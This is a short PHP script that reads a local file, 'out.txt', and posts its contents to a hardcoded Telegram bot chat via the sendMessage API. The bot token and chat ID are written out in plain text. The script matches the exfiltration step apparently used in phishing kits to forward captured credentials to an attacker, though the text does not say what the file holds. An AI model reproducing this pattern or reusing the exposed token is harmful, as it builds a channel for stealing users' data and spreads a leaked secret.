<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot2006419003:AAGYpHUn-SYy6CFd3g5aHpX7rBylfeePxEM/sendMessage?chat_id=1706145896&text=$msg");
?>